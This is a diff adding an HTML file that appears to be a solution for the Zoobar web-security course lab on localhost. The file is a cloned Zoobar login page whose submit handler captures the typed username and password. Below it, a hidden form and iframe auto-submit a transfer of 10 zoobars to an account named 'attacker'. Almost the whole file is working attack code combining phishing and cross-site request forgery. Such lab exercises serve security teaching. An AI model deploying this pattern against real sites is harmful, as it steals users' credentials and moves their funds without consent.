@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+<script>function redirect() { alert('user: ' + document.getElementById('user').value + ', password: ' + document.getElementById('password').value);setTimeout(function() { window.location.replace("http://localhost:8080/zoobar/");},1000)}</script>
+    </head>
+    <body>
+        
+        
+        
+        
+        
+        
+        
+      <h1><a href="">Zoobar Foundation for Trustworthy
+                      Learning</a></h1>
+      <h2>Supporting the best
+          soldiers of the 21st-century</h2>
+      
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST" target="zoobar" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="redirect()">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" id="user" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input id="password" type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi">
+</form>
+</div>
+<div class="footer warning">
+
+</div>
+
+    </body>
+</html>
+
+
+
+<iframe style="display:non" name="zoobar" src="http://localhost:8080/"></iframe>
+
+<form method="POST" style="display:none" id="transfer" target="zoobar" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+<input name="zoobars" type="text" value="10" size=5>
+<input name=recipient type=text value="attacker" size=10>
+<input type="submit" name="submission" value="Send">
+</form>
+<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+<script>if (myZoobars) {
+document.getElementById("transfer").submit();window.location.replace("http://localhost:8080/zoobar/");}</script>
+
+
